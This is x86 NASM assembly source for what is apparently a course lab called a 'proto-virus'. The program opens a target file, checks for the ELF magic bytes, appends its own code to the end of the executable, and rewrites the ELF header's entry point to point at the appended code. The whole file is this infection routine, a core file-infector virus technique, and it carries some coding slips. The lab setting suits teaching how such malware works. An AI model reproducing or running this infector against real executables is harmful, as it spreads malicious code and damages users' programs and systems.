%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%macro  getLocToEcx 1
	call get_my_loc
	sub ecx, next_i - %1
%endmacro

%define	STK_RES	200
%define	STDOUT	1
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0
%define FileDec [ebp-4]
%define Buffer [ebp-200]
%define FileLength [ebp-8]
%define HeaderAndProgramSize [ebp-16]

%define ELF_HeaderSizeBack 52
%define ELF_HeaderSize 40
%define ELF_ProgramSize 0x2A
%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
	global _start

	section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage


code_start:
	getLocToEcx WelcomeMessage
	write STDOUT , ecx , WelcomeMessageLen


	getLocToEcx FileName
	mov ebx, ecx
	open ebx, RDWR,0777
	cmp eax, 0
	jl FileOpenError
	mov FileDec, dword eax
	;;;;;;;Read Length of header;;;;;;;
	lseek dword FileDec, ELF_HeaderSize , SEEK_SET
	lea ecx, HeaderAndProgramSize
	read dword FileDec, ecx, 2	
	lseek dword FileDec, 0 , SEEK_SET
	
	mov edi, HeaderAndProgramSize
	lseek dword FileDec, ELF_ProgramSize , SEEK_SET
	mov dword HeaderAndProgramSize, 0
	lea ecx, HeaderAndProgramSize
	read dword FileDec, ecx, 2	
	lseek dword FileDec, 0 , SEEK_SET
	add HeaderAndProgramSize, edi
	;;;;;;Read header;;;;;;;
	; mov dword HeaderAndProgramSize,150
	mov ecx,0
	lea ecx, Buffer
	read dword FileDec, ecx, dword HeaderAndProgramSize
	
	cmp byte [ecx], 7fh
	jne NotElf
	inc ecx
	cmp byte [ecx], 'E'
	jne NotElf
	inc ecx
	cmp byte [ecx], 'L'
	jne NotElf
	inc ecx
	cmp byte [ecx], 'F'
	jne NotElf

	lseek dword FileDec, 0 , SEEK_SET
	lseek dword FileDec, 0 , SEEK_END
	mov dword FileLength , eax
	;;;;;;;;;Copy Code To End Of File;;;;;;;;;
	getLocToEcx _start
	write dword FileDec, ecx, virus_end - _start

	;;;;;;;;;Change entry address;;;;;;;;;		
	xor ebx, ebx
	mov ebx, [ebp-200 + PHDR_start] ; load offset of program section
	mov ebx, [ebp-200 + ebx + PHDR_vaddr] ; base virtual address(08048000h)
	
	add ebx, dword FileLength
	;mov dword NewEntery, ebx ; might be removed
	mov [ebp - 200 + ENTRY], ebx

	lseek dword FileDec, 0 , SEEK_SET
	lea ecx, Buffer
	write dword FileDec, ecx, HeaderAndProgramSize



; You code for this lab goes here

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
FileOpenError:
	getLocToEcx OpenErrorMessage
	write STDOUT,  ecx, OpenErrorMessageLen
	exit -1

NotElf:
		getLocToEcx ELFErrorMessage
		write STDOUT , ecx , ELFErrorMessage
		exit -1
					
	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0

WelcomeMessage: 	db "This is a Virus", 10, 0
WelcomeMessageLen: equ $ - WelcomeMessage 

OpenErrorMessage: 	db "Failed open file.", 10, 0
OpenErrorMessageLen: equ $ - OpenErrorMessage

ELFErrorMessage: 	db "Specified file is not ELF file", 10, 0
ELFErrorMessageLen: equ $ - ELFErrorMessage

get_my_loc:
		call next_i
		
next_i:
		pop ecx
		ret
	
PreviousEntryPoint: dd VirusExit
virus_end:


